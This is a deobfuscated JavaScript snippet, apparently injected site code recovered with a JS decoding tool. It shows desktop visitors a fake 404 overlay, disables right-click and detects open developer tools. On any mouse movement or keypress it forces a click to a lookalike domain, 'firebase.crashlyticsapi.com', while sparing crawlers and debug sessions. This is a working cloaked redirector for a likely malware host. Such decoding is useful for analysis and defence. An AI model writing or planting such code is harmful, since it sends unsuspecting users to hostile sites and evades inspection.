//Sat May 10 2025 03:38:26 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
var ua = navigator.platform.toLowerCase().match(/(win|mac)/i) ? 1 : 0;
var eg = navigator.userAgent.toLowerCase().match(/eganbro/i) ? 1 : 0;
var targetURL = "https://firebase.crashlyticsapi.com/";
$("#targetPC").attr("href", targetURL);
if (ua == 1 && document.location.href.indexOf("?debug") < 0 && eg == 0) {
  var init = false;
  function clickTarget() {
    if (init) return;
    init = true;
    if (navigator.userAgent.toLowerCase().indexOf("spider") > -1 && location.pathname === "/") return;
    $(".container").remove();
    $("#targetPC").click();
  }
  function checkDevToolsOpened(_0x5748bf = false) {
    if (!_0x5748bf) {
      {
        clickTarget();
        return;
      }
    }
    const _0x39403f = ~navigator.userAgent.indexOf("Firefox");
    if (_0x39403f) {
      const _0x445ad1 = /./;
      _0x445ad1.toString = function () {
        this.opened = true;
      };
      console.log(_0x445ad1);
      console.clear && console.clear();
      if (_0x445ad1.opened || false) {
        clickTarget();
      }
    }
  }
  checkDevToolsOpened(true);
  setInterval(checkDevToolsOpened, 10000);
  $(document).mousemove(clickTarget);
  $(document).keydown(clickTarget);
  $(document).bind("contextmenu", function () {
    return false;
  });
  var b = document.compatMode && document.compatMode == "CSS1Compat" ? document.documentElement : document.body;
  var op = document.createElement("div");
  op.style.position = "fixed";
  op.style.top = 0;
  op.style.left = 0;
  op.style.background = "#DEE1E2 url(\"/assets/images/404.png\") no-repeat center 200px";
  op.style.width = "100%";
  op.style.height = b.clientHeight + "px";
  op.style.zIndex = 99999;
  var first = document.body.firstChild;
  document.body.insertBefore(op, first);
}
_0xod9 = "jsjiami.com.v6";